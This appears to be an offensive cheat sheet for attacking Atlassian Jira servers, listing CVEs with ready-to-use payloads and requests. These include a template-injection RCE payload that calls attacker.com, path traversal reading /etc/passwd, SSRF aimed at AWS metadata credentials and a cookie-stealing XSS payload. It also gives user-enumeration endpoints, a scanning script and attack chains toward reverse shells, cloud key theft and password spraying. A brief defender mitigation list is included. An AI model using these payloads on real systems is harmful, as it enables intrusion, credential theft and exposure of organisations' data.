## 1. Overview

Jira is a widely-used project management and issue tracking platform by Atlassian. From a security perspective, Jira instances are high-value targets due to:

- **Sensitive data exposure**: Project details, internal communications, user information
- **Wide attack surface**: REST APIs, servlet endpoints, OAuth plugins, dashboard features
- **Version-specific vulnerabilities**: Many CVEs affect specific version ranges
- **Common misconfigurations**: Public signups, exposed dashboards, weak access controls

---

## 2. Detection & Reconnaissance

### **Identifying Jira Instances**

Look for these telltale signs:

- `/secure/Dashboard.jspa`
- `/login.jsp`
- `/browse/PROJECT-KEY`
- Atlassian branding/logos

### **Version Detection**

**Method 1: Meta tag check**

```bash
curl -s https://target.com/secure/Dashboard.jspa | grep "ajs-version-number"
# Look for: <meta name="ajs-version-number" content="8.20.9">
```

**Method 2: POM.xml exposure (CVE-2019-8442)**

```bash
curl https://target.com/s/anything/_/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.xml
```

---

## 3. Exploitation Methods

### **🔴 CVE-2019-11581 - Template Injection (RCE)**

**Affected**: < 7.13.9, 8.4.0

**Endpoint**: `/secure/ContactAdministrators!default.jspa`

**Payload (Subject or Body field)**:

```java
$i18n.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('curl http://attacker.com').waitFor()
```

---

### **🔴 CVE-2019-3396 - Path Traversal (LFI/RCE)**

**Affected**: < 7.13.3, 8.0.0 - 8.1.0

**Request**:

```http
POST /rest/tinymce/1/macro/preview HTTP/1.1
Host: target.com
Content-Type: application/json

{"contentId":"1","macro":{"name":"widget","params":{"url":"https://www.viddler.com/v/23464dc5","width":"1000","height":"1000","_template":"file:///etc/passwd"},"body":""}}
```

**For RCE, try**:

```json
{"_template":"../web.xml"}
```

---

### **🟠 CVE-2019-8451 - SSRF**

**Affected**: < 8.4.0

**Endpoint**:

```
https://target.com/plugins/servlet/gadgets/makeRequest?url=https://target.com:1337@attacker.com
```

**High Impact Scenario**: Cloud metadata access

```
?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

---

### **🟠 CVE-2017-9506 - SSRF via OAuth**

**Endpoint**:

```
https://target.com/plugins/servlet/oauth/users/icon-uri?consumerUri=http://169.254.169.254/latest/meta-data/
```

---

### **🟡 CVE-2019-8449 - User Enumeration (Mass Disclosure)**

**Endpoint**:

```
https://target.com/rest/api/latest/groupuserpicker?query=1&maxResults=50000&showAvatar=true
```

Returns full user list with emails, usernames, avatars.

---

### **🟡 CVE-2020-14181 - User Enumeration**

**Endpoint**:

```
https://target.com/secure/ViewUserHover.jspa?username=admin
```

Check response status/content to confirm user existence.

---

### **🟡 CVE-2019-3403 - User Picker Enumeration**

**Endpoint**:

```
https://target.com/rest/api/2/user/picker?query=admin
```

---

### **🟡 CVE-2020-36289 - Username Enumeration**

**Endpoint**:

```
https://target.com/secure/QueryComponentRendererValue!Default.jspa?assignee=user:admin
```

---

### **🟡 CVE-2020-14178 - Project Key Enumeration**

**Test format**:

```
https://target.com/browse.PROJ
https://target.com/browse.TEST
https://target.com/browse.DEV
```

Valid keys return different responses than invalid ones.

---

### **🟡 CVE-2020-14179 - Information Disclosure**

**Endpoint**:

```
https://target.com/secure/QueryComponent!Default.jspa
```

Reveals custom field names and SLA configurations.

---

### **🟡 CVE-2019-8442 - Sensitive Information Disclosure**

**Endpoint**:

```
https://target.com/s/anything/_/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.xml
```

Exposes version info, dependencies, internal paths.

---

### **🟢 CVE-2019-3402 - XSS**

**Endpoint**:

```
https://target.com/secure/ConfigurePortalPages!default.jspa?view=search&searchOwnerUserName=<script>alert(1)</script>&Search=Search
```

---

### **🟢 CVE-2018-20824 - XSS**

**Endpoint**:

```
https://target.com/plugins/servlet/Wallboard/?dashboardId=10000&cyclePeriod=alert(document.domain)
```

**Better payload**:

```
?dashboardId=10100&cyclePeriod=(function(){alert(document.cookie);return%2030000;})()
```

---

### **🟢 CVE-2018-5230 - XSS in Updated Range Filter**

**Steps**:

1. Go to: `https://target.com/issues/?filter=-8`
2. Click "Updated Range" text area
3. Insert payload in "More than [ ] minutes ago" (15 char limit) OR "In range [ ] to [ ]" (no limit, first box only)
4. Use **single quotes only** (no double quotes)

---

### **🔵 Unauthenticated Dashboard Access**

**Endpoint**:

```
https://target.com/rest/api/2/dashboard?maxResults=100
```

Returns dashboards, possibly with sensitive project info.

---

### **🔵 Popular Filters Exposure**

**Endpoints**:

```
https://target.com/secure/ManageFilters.jspa?filterView=popular
https://target.com/secure/ManageFilters.jspa?filterView=search
https://target.com/secure/ConfigurePortalPages!default.jspa?view=popular
```

---

### **🔵 Signup Enabled Check**

**Request**:

```http
POST /servicedesk/customer/user/signup HTTP/1.1
Host: target.com
Content-Type: application/json

{"email":"test@attacker.com","signUpContext":{},"secondaryEmail":"","usingNewUi":true}
```

If successful → Self-registration is open.

---

## 4. Higher Impact Scenarios

### **Chain SSRF → Cloud Metadata → RCE**

1. Use CVE-2019-8451 or CVE-2017-9506
2. Target: `http://169.254.169.254/latest/meta-data/iam/security-credentials/`
3. Extract AWS keys
4. Use keys to pivot into cloud infrastructure

### **User Enum → Credential Stuffing**

1. Extract full user list via CVE-2019-8449
2. Use emails/usernames for password spraying
3. Target SSO or admin accounts

### **Template Injection → Full System Compromise**

1. Exploit CVE-2019-11581 for RCE
2. Upload web shell or reverse shell
3. Pivot to internal network/databases

### **XSS → Session Hijacking**

1. Use stored XSS (CVE-2019-3402, CVE-2018-20824)
2. Steal admin session cookies
3. Access sensitive projects/configurations

---

## 5. Automation & Tools

### **Recommended Scanners**

```bash
# Jira Scanner
git clone https://github.com/bcoles/jira_scan
python3 jira_scan.py -u https://target.com

# Jira-Lens
git clone https://github.com/MayankPandey01/Jira-Lens
python3 jira-lens.py -u https://target.com
```

### **Quick CVE Check Script**

```bash
#!/bin/bash
TARGET=$1

echo "[+] Checking Jira vulnerabilities for $TARGET"

# Version check
curl -s "$TARGET/s/_/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.xml" | grep -i version

# User enum
curl -s "$TARGET/rest/api/latest/groupuserpicker?query=1&maxResults=100" | jq .

# Dashboard leak
curl -s "$TARGET/rest/api/2/dashboard?maxResults=100" | jq .

# Info disclosure
curl -s "$TARGET/secure/QueryComponent!Default.jspa"

echo "[+] Done"
```

---

## 6. Mitigations (For Defenders)

- **Keep Jira updated** to latest version
- **Disable public signup** unless required
- **Restrict anonymous access** to dashboards, filters, and user pickers
- **Implement WAF rules** for known exploit patterns
- **Monitor logs** for suspicious API calls (`/rest/api/`, `/plugins/servlet/`)
- **Use IP whitelisting** for admin panels
- **Disable unused plugins** (OAuth, gadgets, etc.)
- **Regular security audits** of custom fields and SLA configurations

---

## 7. Reference CVEs

|CVE|Type|Severity|Affected Versions|
|---|---|---|---|
|CVE-2019-11581|Template Injection (RCE)|Critical|< 7.13.9, < 8.4.0|
|CVE-2019-3396|Path Traversal/RCE|Critical|< 7.13.3, 8.0.0-8.1.0|
|CVE-2019-8451|SSRF|High|< 8.4.0|
|CVE-2017-9506|SSRF|High|Multiple versions|
|CVE-2019-8449|User Disclosure|Medium|< 8.4.0|
|CVE-2020-14181|User Enumeration|Medium|Multiple versions|
|CVE-2019-3403|User Enumeration|Medium|Multiple versions|
|CVE-2020-36289|User Enumeration|Medium|Multiple versions|
|CVE-2020-14178|Project Key Enum|Low|Multiple versions|
|CVE-2020-14179|Info Disclosure|Medium|Multiple versions|
|CVE-2019-8442|Info Disclosure|Medium|Multiple versions|
|CVE-2019-3402|XSS|Medium|Multiple versions|
|CVE-2018-20824|XSS|Medium|Multiple versions|
|CVE-2018-5230|XSS|Medium|Multiple versions|

**Full CVE Database**: [CVEDetails - Atlassian Jira](https://www.cvedetails.com/vulnerability-list/vendor_id-3578/product_id-8170/Atlassian-Jira.html)

---

**🎯 Pro Tip**: Always check for version-specific exploits first. Many Jira instances run outdated versions with known critical vulns. Start with RCE/SSRF, then move to enumeration and XSS for lower-hanging fruit.